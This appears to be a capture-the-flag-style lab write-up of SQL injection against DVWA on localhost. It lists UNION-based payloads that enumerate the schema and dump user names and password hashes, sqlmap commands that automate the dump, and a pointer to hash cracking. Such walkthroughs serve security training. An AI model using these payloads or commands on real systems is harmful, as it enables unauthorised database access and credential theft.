# SQL Injection (High Level)

## Vulnerability Overview

At the high-security level, DVWA introduces prepared statements with MySQLi, which help protect the SQL structure. However, the session variable `$_SESSION['id']` is still directly used in the query.

### 1. SQL Injection Vulnerability
The `$id` value from the session is inserted directly into the query string without any validation or sanitization.  
This allows an attacker to inject malicious SQL code by manipulating the session value.

### 2. Unsafe Error Message
Although detailed server information is not exposed, the application still stops execution and displays an error message.  
This behavior can help attackers infer vulnerabilities and craft further attacks.

---

# Exploitation

## 1. Authentication Bypass

**Payload Used:**
```sql
1' or '1' = '1
```

This always-true condition bypasses authentication filters and retrieves all database rows.

---

## 2. Extracting Database User and Name

**Payload Used:**
```sql
1' union select database(), user() #
```

This forces the database to return the current database name and user.  
Result shows:
- Database: `dvwa`
- User: `dvwa_user@localhost`

---

## 3. Enumerating Tables

**Payload Used:**
```sql
1' union select 1, table_name from information_schema.tables #
```

This command lists all the tables present in the database.

---

## 4. List Tables in DVWA Only

**Payload Used:**
```sql
1' union select 1, table_name from information_schema.tables where table_schema = 'dvwa' #
```

This payload filters and lists only the tables under the `dvwa` database schema.

---

## 5. Finding Columns Inside the Users Table

**Payload Used:**
```sql
1' union select 1, column_name from information_schema.columns where table_name = 'users' #
```

This command enumerates all columns inside the `users` table.

---

## 6. Dumping User Credentials

**Payload Used:**
```sql
' UNION SELECT user, password FROM users #
```

This successfully retrieves usernames and hashed passwords from the `users` table.

Password hashes can then be cracked using external tools like CrackStation.

---

# SQLMap Automation

SQLMap was used to automate the SQL Injection process.

## 1. Check Vulnerability

**Command:**
```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=high; PHPSESSID=xyz123" --batch
```

**Output:**
- SQLMap detected multiple injection techniques: Boolean-based, Error-based, Time-based, and UNION-based.
- Database identified: MySQL (MariaDB) on Apache server (Debian Linux).

---

## 2. Display All Tables in the Database

**Command:**
```bash
sqlmap --tables
```

**Output:**
- Lists all tables inside the `dvwa` database.

---

## 3. Display All Columns of the Users Table

**Command:**
```bash
sqlmap --columns -T users
```

**Output:**
- Displays all column names in the `users` table.

---

## 4. Dump User Credentials

**Command:**
```bash
sqlmap --dump -T users
```

**Output:**
- Successfully dumps all usernames and hashed passwords from the `users` table.

These credentials can then be used for further login attempts or brute-force cracking.

---

# âœ… Done!

This concludes the SQL Injection exploitation on DVWA at high security level.
